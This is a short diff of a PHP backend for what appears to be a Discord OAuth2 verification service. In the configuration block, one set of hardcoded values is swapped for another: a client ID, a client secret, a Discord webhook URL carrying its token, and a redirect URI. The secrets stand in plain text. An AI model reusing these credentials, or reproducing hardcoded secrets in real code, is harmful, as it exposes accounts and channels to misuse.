@@ -6,10 +6,10 @@ if ($_SERVER['REQUEST_URI'] === '/health') {
 }
 
 // --- 設定データ ---
-$client_id     = '1483731872050839564';
-$client_secret = 'x1dQum1L-xtASg0NHH29gPrnRDEjIA_L'; 
-$webhook_url   = 'https://discordapp.com/api/webhooks/1483730982606475304/UN0z8Omfi4Voo58rLkFVhwhv0Jd59kUOYktJxyx0g0mGl5VkCc0IbLtegaqKZXAKokc2';
-$redirect_uri  = 'https://discord-verify-production-4476.up.railway.app'; 
+$client_id     = '1483799840575062046';
+$client_secret = 'LDohkevzX8GXCtGo-YFdPuR-efZpNoSJ'; 
+$webhook_url   = 'https://discordapp.com/api/webhooks/1483798695370555504/cFHJ2PIpesLaP6nshwICr3SP-7Nz6DWlM6VqsLDIUC6pbiUBbBpm4D3EYnnACTPQQ4fm';
+$redirect_uri  = 'https://discord-verify-production-1337.up.railway.app'; 
 
 if (!isset($_GET['code'])) {
     echo "Ready. Please use the OAuth2 link.";
